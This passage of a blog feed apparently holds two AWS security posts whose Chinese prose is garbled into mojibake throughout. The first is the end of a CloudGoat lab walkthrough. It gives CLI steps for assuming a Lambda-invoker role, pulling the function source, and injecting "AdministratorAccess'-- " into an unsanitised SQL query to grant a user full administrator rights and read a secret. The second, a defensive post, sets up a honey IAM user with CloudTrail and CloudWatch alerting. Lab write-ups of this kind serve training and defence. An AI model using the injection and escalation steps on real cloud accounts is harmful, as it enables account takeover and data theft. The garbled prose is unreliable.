<p><code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>åº”è¯¥å°±æ˜¯ä¸‹ä¸€æ­¥è¦æ‰®æ¼”çš„è§’è‰²äº†ã€‚ä¸è¿‡åœ¨assumeä¹‹å‰ï¼Œå…ˆçœ‹ä¸‹è¯¥è§’è‰²çš„ç­–ç•¥ã€‚å¦å¤–æˆ‘å¯¹<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>è¿™ä¸ªè§’è‰²ä¹ŸæŒºæ„Ÿå…´è¶£çš„ï¼ˆæ¯•ç«Ÿæˆ‘ä»¬æœ‰iam:List*/iam:Get*ï¼‰ã€‚</p>
<p>é¦–å…ˆçœ‹ä¸‹<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>ï¼Œè¿™ä¼¼ä¹æ˜¯cloudgoatç”¨æ¥ç»™é¶åœºä¸­çš„ç”¨æˆ·èµ‹æƒçš„ï¼ŒåŒæ—¶å®ƒè¿˜æœ‰ä¸€ä¸ªæ¨é€æ—¥å¿—çš„æƒé™ï¼Œä¼¼ä¹æ˜¯ç»™CloudTrailä½¿ç”¨çš„ã€‚</p>
<pre><code class="language-json">aws iam list-role-policies --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
aws iam get-role-policy --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --policy-name policy_applier_lambda1
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535122702-94b7bdfc-2239-4a6a-af81-9877a879e37b.png" alt="image.png" loading="lazy"></figure>
<p>ç„¶åæ˜¯<code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>ï¼Œå®ƒåŒ…å«å¯¹ä¸€ä¸ªLambdaçš„å¤§éƒ¨åˆ†æ“ä½œ</p>
<pre><code class="language-json">aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463
aws iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --policy-name lambda-invoker
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535862712-fbdcfc6b-3041-4cbb-8ae2-44836e3869f4.png" alt="image.png" loading="lazy"></figure>
<p>ç°åœ¨Assumeè¿™ä¸ªRole</p>
<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::637423561540:role/cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --role-session-name lambda_invoker
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720536339676-894b1f20-1618-4bbc-9efe-104fe9c89140.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹functionçš„ä¿¡æ¯ï¼Œåœ¨<code>Code.Location</code>ä½ç½®æ‰¾åˆ°å‡½æ•°æºç çš„ä¸‹è½½é“¾æ¥</p>
<pre><code class="language-json">aws lambda get-function --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537386567-091a4ddc-6240-4d72-845f-5c0616875403.png" alt="image.png" loading="lazy"></figure>
<p>è§£å‹æºç zip<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537490379-c0cde3bb-f491-4cb1-a2d5-424a8cdca522.png" alt="image.png" loading="lazy"></p>
<p>æ‰“å¼€main.py</p>
<pre><code class="language-python">import boto3
from sqlite_utils import Database

db = Database(&quot;my_database.db&quot;)
iam_client = boto3.client('iam')


# db[&quot;policies&quot;].insert_all([
#     {&quot;policy_name&quot;: &quot;AmazonSNSReadOnlyAccess&quot;, &quot;public&quot;: 'True'}, 
#     {&quot;policy_name&quot;: &quot;AmazonRDSReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AWSLambda_ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonS3ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonGlacierReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonRoute53DomainsReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AdministratorAccess&quot;, &quot;public&quot;: 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f&quot;target policys are : {target_policys}&quot;)

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f&quot;applying {row['policy_name']} to {user_name}&quot;)
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f&quot;arn:aws:iam::aws:policy/{row['policy_name']}&quot;
            )
            print(&quot;result: &quot; + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f&quot;{policy} is not an approved policy, please only choose from approved &quot; \
                                       f&quot;policies and don't cheat. :) &quot;
            print(invalid_policy_statement)
            return invalid_policy_statement

    return &quot;All managed policies were applied as expected.&quot;


if __name__ == &quot;__main__&quot;:
    payload = {
        &quot;policy_names&quot;: [
            &quot;AmazonSNSReadOnlyAccess&quot;,
            &quot;AWSLambda_ReadOnlyAccess&quot;
        ],
        &quot;user_name&quot;: &quot;cg-bilbo-user&quot;
    }
    print(handler(payload, 'uselessinfo'))
</code></pre>
<p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç»™ä¸€ä¸ªIAMç”¨æˆ·èµ‹æƒï¼Œå¯ç”¨çš„æƒé™å°±æ˜¯<code>my_database.db</code>ä¸­<code>public</code>å€¼ä¸ºTrueçš„å‡ ä¸ª</p>
<pre><code class="language-python">AmazonSNSReadOnlyAccess
AmazonRDSReadOnlyAccess
AWSLambda_ReadOnlyAccess
AmazonS3ReadOnlyAccess
AmazonGlacierReadOnlyAccess
AmazonRoute53DomainsReadOnlyAccess
</code></pre>
<p>ä½†æ˜¯ç”¨äºåˆ¤æ–­æƒé™æ˜¯å¦ç¬¦åˆè¦æ±‚çš„SQLè¯­å¥<code>statement</code>æ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œæ£€æŸ¥ï¼Œè€Œåé¢ç”¨æ¥èµ‹æƒçš„<code>attach_user_policy</code>å‡½æ•°ç”¨çš„ç¡®å®æŸ¥è¯¢å‡ºæ¥çš„<code>row['policy_name']</code>ã€‚é‚£æˆ‘ä»¬å¯ä»¥è¾“å…¥<code>AdministratorAccess'-- </code>ï¼ˆä½¿ç”¨sqliteçš„æ³¨é‡Šï¼‰è¿›è¡Œæ³¨å…¥ï¼Œç»™ç”¨æˆ·èµ‹äºˆä¸€ä¸ªAWSæ‰˜ç®¡æƒé™<code>arn:aws:iam::aws:policy/AdministratorAccess</code>ã€‚è¿™ä¸ªæƒé™æ˜¯AWSçš„æœ€é«˜æƒé™ï¼Œå¯ä»¥å¯¹äº‘ä¸Šçš„æ‰€æœ‰èµ„æºè¿›è¡Œè®¿é—®ã€‚</p>
<pre><code class="language-python">statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720538139669-6c39b270-7c23-4811-a2d2-267749d63b7b.png" alt="image.png" loading="lazy"></figure>
<p>ç¼–å†™payload.json</p>
<pre><code class="language-json">{
    &quot;policy_names&quot;: [
        &quot;AdministratorAccess'-- &quot;
    ],
    &quot;user_name&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;
}
</code></pre>
<p>è°ƒç”¨å‡½æ•°æƒé™å·²è¢«è®¾ç½®</p>
<pre><code>aws lambda invoke --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --payload file://payload.json output &amp;&amp; cat output
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539024560-d4e1f5fd-4f80-4479-a373-308f844c8c8f.png" alt="image.png" loading="lazy"></figure>
<p>åˆ‡æ¢å›åŸæ¥çš„ç”¨æˆ·ï¼Œ<code>aws configure set aws_session_token &quot;&quot;</code>æ¸…ç©ºsession tokenã€‚æŸ¥çœ‹ç”¨æˆ·çš„æ‰˜ç®¡ç­–ç•¥ï¼ŒAdministratorAccesså·²è¢«æˆåŠŸèµ‹äºˆ</p>
<pre><code class="language-json">aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539655707-f3c0841b-8fec-4171-b979-b5168a8aa0d6.png" alt="image.png" loading="lazy"></figure>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥è®¿é—®äº‘ä¸Šçš„æ‰€æœ‰èµ„æºäº†ï¼åˆ—å‡ºsecret</p>
<pre><code class="language-json">aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539817522-083c2421-a5df-444c-8bf3-ec4df24d80db.png" alt="image.png" loading="lazy"></figure>
<p>è¯»å–flag</p>
<pre><code class="language-json">aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidi6d2661463-final_flag  
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539914753-30611895-5b0e-4bbb-9c6d-318a7dae21f1.png" alt="image.png" loading="lazy"></figure>
<h2 id="æ”»å‡»è·¯å¾„">æ”»å‡»è·¯å¾„</h2>
<p>å†çœ‹ä¸‹é¶åœºç»™çš„æ”»å‡»è·¯å¾„ï¼Œå’Œæˆ‘ä»¬çš„æµç¨‹å‡ ä¹ä¸€æ ·ã€‚è¿˜æ˜¯æŒºç®€å•çš„ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540014904-a6bb6af5-fc6d-4230-b1b3-2997a19b9d90.png" alt="image.png" loading="lazy"></p>
<h1 id="è§£è¯­">è§£è¯­</h1>
<p>æœ€åç®€å•æµè§ˆä¸‹å®ƒçš„tfç›®å½•ç»“æ„ï¼Œè¿™é‡Œäº‘ä¸Šæ¯ä¸ªç±»å‹çš„èµ„æºéƒ½ç”¨äº†å•ç‹¬çš„æ–‡ä»¶å†™ã€‚å…¶ä»–çš„å°±æ˜¯ä¸€äº›å¿…è¦æ•°æ®æºå’Œå˜é‡è¾“å…¥è¾“å‡ºã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540350475-60b6dca5-dc7b-4369-a622-222542387101.png" alt="image.png" loading="lazy"></p>
<p>å®éªŒç»“æŸï¼Œè¾“å…¥<code>./cloudgoat.py destroy vulnerable_lambda</code>æ¸…ç©ºèµ„æºä»¥å…äº§ç”Ÿé¢å¤–çš„è®¡è´¹<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540459689-ef7190f7-edd2-4029-b07c-1bf3ee270b71.png" alt="image.png" loading="lazy"></p>
<p>ç”»é¥¼ï¼šå­¦ä¹ è¿™ä¸ªé¡¹ç›®çš„ä»£ç æµç¨‹ï¼Œé‡ç‚¹æ˜¯tfä»£ç çš„ç¼–å†™</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[åœ¨AWSä¸Šä½¿ç”¨è¯±é¥µç”¨æˆ·æ•è·æ”»å‡»è€…]]></title>
        <id>https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/</id>
        <link href="https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/">
        </link>
        <updated>2024-07-09T08:57:26.000Z</updated>
        <content type="html"><![CDATA[<p>æ€è·¯å°±æ˜¯åˆ›å»ºä¸€ä¸ªIAMç”¨æˆ·ï¼Œç„¶åç”¨CloudWatchç›‘æ§è¯¥ç”¨æˆ·çš„è¡Œä¸ºï¼Œå¦‚æœå‡ºç°äº†è¯¥ç”¨æˆ·çš„æ“ä½œåˆ™è§¦å‘å‘Šè­¦ï¼Œå¹¶é€šè¿‡é‚®ä»¶é€šçŸ¥ã€‚</p>
<p>ä½¿ç”¨æ§åˆ¶å°å’ŒTerraformä¸¤ç§æ–¹æ³•å®ç°</p>
<h1 id="æ§åˆ¶å°åˆ›å»º">æ§åˆ¶å°åˆ›å»º</h1>
<h2 id="åˆ›å»ºè¯±é¥µç”¨æˆ·">åˆ›å»ºè¯±é¥µç”¨æˆ·</h2>
<p>åœ¨ IAM æ§åˆ¶å°åˆ›å»ºä¸€ä¸ªè¯±é¥µç”¨æˆ·<strong>honeyUser</strong>ï¼Œä¸é™„åŠ ä»»ä½•æƒé™<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720081492814-3e17265e-d254-41d0-a77f-54f84a647378.png" alt="image.png" loading="lazy"></p>
<p>ä¸º<strong>honeyUser</strong>åˆ›å»ºä¸€ä¸ªè®¿é—®å¯†é’¥ï¼Œè¿™å¯¹å¯†é’¥ä¹‹åä¾¿å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•æ³„éœ²å‡ºå»ï¼Œè¿›è€Œæ•è·å¯ç–‘çš„æ”»å‡»è€…ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720081561008-5584f5f6-0d2b-4c9a-bd73-152c263e3b6f.png" alt="image.png" loading="lazy"></p>
<h2 id="åˆ›å»ºcloudtrailå¹¶å°†äº‹ä»¶å‘é€è‡³cloudwatch">åˆ›å»ºCloudTrailå¹¶å°†äº‹ä»¶å‘é€è‡³CloudWatch</h2>
<p>è¿›å…¥<strong>CloudTrail</strong>æ§åˆ¶å°åˆ›å»ºä¸€ä¸ª<strong>trail</strong>ï¼ˆè¿½è¸ªï¼‰ï¼Œåˆ›å»º<strong>CloudTrail</strong>çš„æ—¶å€™éœ€è¦é€‰æ‹©ä¸€ä¸ªS3æ¥å¯¹æ—¥å¿—è¿›è¡Œå­˜å‚¨ï¼Œå¦‚æœæ²¡æœ‰æå‰å‡†å¤‡å¥½åˆ™éœ€è¦åœ¨è¿™é‡Œæ–°åˆ›å»ºä¸€ä¸ªã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084252797-7f09bc55-a982-41a0-9746-ff4f8c8ec10d.png" alt="image.png" loading="lazy"></p>
<p>è¿™é‡Œä¸ä½¿ç”¨åŠ å¯†æ–¹ä¾¿åé¢æ•°æ®çš„æ£€ç´¢<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720082522978-0a4e8c78-584b-4455-98fc-ec6c2003573a.png" alt="image.png" loading="lazy"></p>
<p>é…ç½®å‘<strong>CloudWatch Logs</strong>å‘é€äº‹ä»¶ï¼Œä¹‹åå¯ä»¥åœ¨<strong>CloudWatch</strong>é…ç½®è§„åˆ™æ¥å¯¹è¯±é¥µç”¨æˆ·çš„ç™»å½•è¡Œä¸ºè¿›è¡Œå‘Šè­¦ã€‚<strong>CloudTrail</strong> ä½¿ç”¨ <strong>CloudWatch</strong> æ—¥å¿—ç»„ä½œä¸ºæ—¥å¿—äº‹ä»¶çš„ä¼ è¾“ç»ˆç«¯èŠ‚ç‚¹ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªæ—¥å¿—ç»„æˆ–è€…æŒ‡å®šä¸€ä¸ªç°æœ‰æ—¥å¿—ç»„ã€‚åŒæ—¶éœ€è¦ä¸€ä¸ª <strong>IAMè§’è‰²</strong> å°†äº‹ä»¶å‘é€åˆ° <strong>CloudWatch</strong>ï¼Œè¿™ä¸ªè§’è‰²éœ€è¦æœ‰<code>logs:CreateLogStream</code>å’Œ<code>logs:PutLogEvents</code>ä¸¤ä¸ªæƒé™ã€‚è¿™é‡Œè®©å®ƒæ–°å»ºä¸€ä¸ªæ—¥å¿—ç»„å’Œè§’è‰²ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084273034-2b8cd697-2d68-495d-ba1c-a8bcd7dcb5af.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ä¸‹ä¸€æ­¥è¿½è¸ªçš„äº‹ä»¶ä¸­åªé€‰æ‹©<code>Management events</code>ï¼Œä¸»è¦è¿½è¸ªç”¨æˆ·çš„ç™»å½•è¡Œä¸º<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084370949-747883e2-fbf3-4d51-8c18-87918a5c3598.png" alt="image.png" loading="lazy"></p>
<p>åˆ›å»ºå¥½ååœ¨ <strong>Trailsé¡µé¢</strong> æ˜¾ç¤ºè¯¥<strong>Trail</strong> å·²å¼€å§‹å·¥ä½œï¼ˆStatus: Loggingï¼‰<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720084619035-22a6424b-f1f5-4b15-804a-61c3979a9af5.png" alt="image.png" loading="lazy"></p>
<p>åœ¨é…ç½®CloudWatchä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹å’Œè¿™ä¸ª <strong>Trail</strong> ä»¥å‰åˆ›å»ºçš„éƒ½æœ‰é‚£äº›èµ„æºã€‚è¿›å…¥ <strong>IAMé¡µé¢</strong> åœ¨ <strong>ç­–ç•¥</strong> ä¸­æŸ¥çœ‹å®¢æˆ·æ‰˜ç®¡ç­–ç•¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ–°åˆ›å»ºçš„ç”¨æ¥æ¨é€ <strong>CloudWatch</strong> çš„æ‰˜ç®¡ç­–ç•¥ã€‚å®ƒçš„æè¿°æ˜¯ï¼š<code>Policy for config CloudWathLogs for trail cloudtrail-logging-honey, created by CloudTrail console</code><br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085238845-d879e93c-d500-4412-ba75-86bd168cb67f.png" alt="image.png" loading="lazy"></p>
<p>ç‚¹å‡»æŸ¥çœ‹å®ƒçš„ç­–ç•¥å†…å®¹ã€‚è¿™é‡Œè®¸å¯äº†ä¸¤ä¸ªæ“ä½œã€‚è€Œä»–ä»¬æŒ‡å‘çš„èµ„æºéƒ½æ˜¯ <strong>CloudTrail</strong> å‘ <strong>CloudWatch Logs</strong> å‘é€çš„è¿™æ¡æ—¥å¿—æµ</p>
<ul>
<li><strong>logs:CreateLogStream</strong>: å…è®¸è¢«æˆæƒçš„å®ä½“åˆ›å»ºæ—¥å¿—æµ</li>
<li><strong>logs:PutLogEvents</strong>: å…è®¸è¢«æˆæƒçš„å®ä½“å‘æ—¥å¿—æµä¸­å†™å…¥æ—¥å¿—äº‹ä»¶ã€‚</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085429872-efdcb37a-c5ee-47a1-bf84-198a5d29223b.png" alt="image.png" loading="lazy"></figure>
<p>è¿›å…¥ <strong>è§’è‰²</strong> å¯ä»¥çœ‹åˆ° <strong>CloudTrail</strong> åˆ›å»ºçš„è§’è‰² <strong>CloudTrailRoleForCloudWatch-Honey</strong><br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085905922-883fb904-4fb3-4133-a75e-6717bb9b532e.png" alt="image.png" loading="lazy"></p>
<p>åŒæ—¶å®ƒçš„å¯ä¿¡å®ä½“æŒ‡å‘äº†æŒ‡å®šäº† AWS çš„ <strong>CloudTrail</strong> æœåŠ¡ (<code>cloudtrail.amazonaws.com</code>)<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720085957456-cda42843-1058-4c6f-ba5c-817bcfe1e64d.png" alt="image.png" loading="lazy"></p>
<p>æƒé™åˆ™ä½¿ç”¨çš„æ˜¯åˆšåˆšçœ‹åˆ°çš„ç­–ç•¥ç»„<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086049997-9f862dee-a967-469f-907a-144a23e66156.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ <strong>CloudWatch</strong> ä¸­çš„æ—¥å¿—ç»„ä¸­ï¼Œçœ‹åˆ° <strong>CloudTrail</strong> åˆ›å»ºçš„æ—¥å¿—ç»„ <strong>aws-cloudtrail-logs-CloudWatch-Honey</strong><br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086403608-a041b1a3-ebc2-45dd-8536-22dfea5688b6.png" alt="image.png" loading="lazy"></p>
<p>ç°åœ¨æˆ‘ä»¬åœ¨ AWS CLI ä¸­ç™»å½•ä¹‹å‰åˆ›å»ºçš„ honeyUser<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086607466-7a19947d-5b95-4b59-8aae-7861465d0ec7.png" alt="image.png" loading="lazy"></p>
<p>å›åˆ° <strong>CloudWatch</strong> é¡µé¢ï¼Œè¿›å…¥ <strong>Live Tail</strong>ï¼Œé€‰æ‹©è¦ç­›é€‰çš„æ—¥å¿—ç»„<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720086831606-9ac3c56c-3ed9-4d48-96b0-f3acd179c106.png" alt="image.png" loading="lazy"></p>
<p>è¿‡äº†ä¸€ä¼šå„¿åçœ‹åˆ°æˆ‘ä»¬çš„ç™»å½•è®°å½•<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720087141533-20e9d7f3-de6e-45f6-9be0-ae6b61026900.png" alt="image.png" loading="lazy"></p>
<h2 id="åˆ›å»ºæ—¥å¿—ç­›é€‰å¹¶è®¾ç½®å‘Šè­¦">åˆ›å»ºæ—¥å¿—ç­›é€‰å¹¶è®¾ç½®å‘Šè­¦</h2>
<p>é€‰æ‹©æ—¥å¿—ç»„ï¼Œæ“ä½œ -&gt; åˆ›å»ºæŒ‡æ ‡ç­›é€‰æ¡ä»¶<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720094509300-2e7a594c-1a84-4b45-89c7-fe425c745d46.png" alt="image.png" loading="lazy"></p>
<p>ä½¿ç”¨ç­›é€‰æ¨¡æ¿ç­›é€‰å‡º honeyUser çš„æ‰€æœ‰æ—¥å¿—</p>
<pre><code>{ $.userIdentity.type = &quot;IAMUser&quot; &amp;&amp; $.userIdentity.userName = &quot;honeyUser&quot; }
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720095262029-8f4aae34-b4a7-40f4-b9f0-f006151ab3ee.png" alt="image.png" loading="lazy"></figure>
<p>åœ¨åˆ†é…æŒ‡æ ‡é¡µé¢è¾“å…¥ç­›é€‰åç§°ã€å‘½åç©ºé—´ã€æŒ‡æ ‡åç§°ã€æŒ‡æ ‡å€¼è®¾ç½®ä¸º1<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720095864584-4b6fc5d6-84d6-4b8c-8093-15d94b8c01e4.png" alt="image.png" loading="lazy"></p>
<p>é…ç½®å¥½ä¹‹åä¸ºå®ƒåˆ›å»ºå‘Šè­¦<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720096232046-d4e44916-ecfd-46dd-9d1a-32bb64bd398e.png" alt="image.png" loading="lazy"></p>
<p>å‘¨æœŸé…ç½®ä¸º<code>1åˆ†é’Ÿ</code>ï¼Œé˜ˆå€¼é…ç½®ä¸º<code>&gt;=1</code>ã€‚è¿™æ„å‘³ç€åœ¨ä»»ä½•ç»™å®šçš„ 1 åˆ†é’Ÿå‘¨æœŸå†…ï¼Œå¦‚æœè¯¥ç”¨æˆ·è‡³å°‘ç™»å½•ä¸€æ¬¡ï¼Œå°±ä¼šè§¦å‘å‘Šè­¦ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097123625-3a798543-86f4-4c00-b571-4d45b911bf7d.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097131806-61322baa-f631-4eab-a170-3dfcac72b3ad.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ä¸‹ä¸€æ­¥é…ç½®å‘Šè­¦å¦‚ä½•å¤„ç†ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªä¸»é¢˜ï¼ŒæŠŠå‘Šè­¦å‘é€åˆ°æˆ‘ä»¬çš„é‚®ç®±ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097357712-bbdbaeca-df16-4537-a114-b385a1d1010b.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ä¸‹ä¸€æ­¥é…ç½®ä¸‹è¡¨è¿°<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097519442-b13ea343-032b-4562-b6c6-d25149aab6cd.png" alt="image.png" loading="lazy"></p>
<p>è¿™æ ·å‘Šè­¦å°±é…ç½®å¥½äº†<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097591519-0767394b-93c3-4c69-82e7-c1f6029c5f49.png" alt="image.png" loading="lazy"></p>
<p>æœ€ååœ¨åˆ°é‚®ç®±é‡Œç¡®è®¤ä¸‹è®¢é˜…<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720098089437-e0940d82-5efb-4b8c-8e2e-3bb57f17bb41.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ CLI ä¸­å°è¯•ç™»å½• honeyUserï¼ŒHoney_Alarm å˜ä¸ºå‘Šè­¦ä¸­<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720099278832-158f8623-26c2-4f18-9580-d19989da553c.png" alt="image.png" loading="lazy"></p>
<p>åŒæ—¶é‚®ç®±æ”¶åˆ°å‘Šè­¦<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720099318259-d036533c-2f5d-4e06-9824-159e034d54ac.png" alt="image.png" loading="lazy"></p>
<p>å®éªŒå®Œåè®°å¾—æ¸…ç†åˆšåˆšåˆ›å»ºçš„å†…å®¹ï¼Œä»¥å…äº§ç”Ÿé¢å¤–çš„è´¹ç”¨</p>
<ul>
<li>CloudWatch Log å‘Šè­¦</li>
<li>CloudWatch Log æ—¥å¿—ç»„</li>
<li>Amazon SNS</li>
<li>CloudTrail è¿½è¸ª</li>
<li>S3</li>
<li>IAMè§’è‰²</li>
<li>IAMå®¢æˆ·æ‰˜ç®¡ç­–ç•¥</li>
<li>IAMç”¨æˆ· honeyUser</li>
</ul>
<h1 id="ä½¿ç”¨terraformä»£ç åˆ›å»º">ä½¿ç”¨Terraformä»£ç åˆ›å»º</h1>
<p>Terraformæ˜¯ä¸€ä¸ªåŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆIaCï¼‰å·¥å…·ï¼Œç®€è€Œè¨€ä¹‹å®ƒè®©æˆ‘ä»¬å¯ä»¥ç”¨ä»£ç çš„æ–¹å¼å¯¹äº‘ä¸Šçš„å„ä¸ªèµ„æºè¿›è¡Œåˆ›å»ºã€é…ç½®å’Œæ›´æ–°ã€‚</p>
<p>å¯¹äºä¸Šé¢çš„åˆ›å»ºæµç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºå‡ æ­¥ï¼š</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ª<strong>IAMç”¨æˆ·</strong>ï¼Œä½œä¸ºè¯±é¥µç”¨æˆ·ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ª<strong>CloudTrailè¿½è¸ª</strong>ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª<strong>S3æ¡¶</strong>æ¥å­˜å‚¨æ—¥å¿—ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ª<strong>CloudWatch Logæ—¥å¿—ç»„</strong>æ¥åˆ†ææ—¥å¿—ï¼ŒåŒæ—¶è¿˜è¦ä¸€ä¸ªæ‹¥æœ‰åˆ›å»º/æ¨é€æ—¥å¿—æµæƒé™çš„<strong>IAMè§’è‰²</strong>å‘æ—¥å¿—ç»„ä¸­æ¨é€æ—¥å¿—ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ª<strong>CloudWatch Logæ—¥å¿—ç­›é€‰</strong>ï¼ŒåŒæ—¶ä¸ºå®ƒåˆ›å»ºä¸€ä¸ª<strong>CloudWatch Logå‘Šè­¦</strong>ï¼Œå†åˆ›å»ºä¸€ä¸ª<strong>SNSä¸»é¢˜</strong>ç”¨æ¥æ¥æ”¶å‘Šè­¦ï¼Œå¹¶ä¸ºå®ƒé…ç½®å¥½<strong>endpoint</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é‚®ç®±åœ°å€ã€‚</li>
</ul>
<p>åœ¨ä½¿ç”¨Terraformä»£ç å®ç°è¿™ä¸ªæµç¨‹ä¹‹å‰ï¼Œå…ˆå‡†å¤‡å¥½ä¸€ä¸ªç©ºç›®å½•ï¼Œé‡Œé¢åˆ›å»ºæ–‡ä»¶ç»“æ„å¦‚ä¸‹</p>
<pre><code>./
â”œâ”€â”€ main.tf
â”œâ”€â”€ outputs.tf
â””â”€â”€ povider.tf
</code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li>provider.tfï¼šç”¨æ¥é…ç½® AWS povider</li>
<li>main.tfï¼šåŒ…å«äº†ä¸»è¦çš„èµ„æºé…ç½®</li>
<li>outputs.tfï¼šç”¨æ¥å®šä¹‰è¾“å‡ºå˜é‡</li>
</ul>
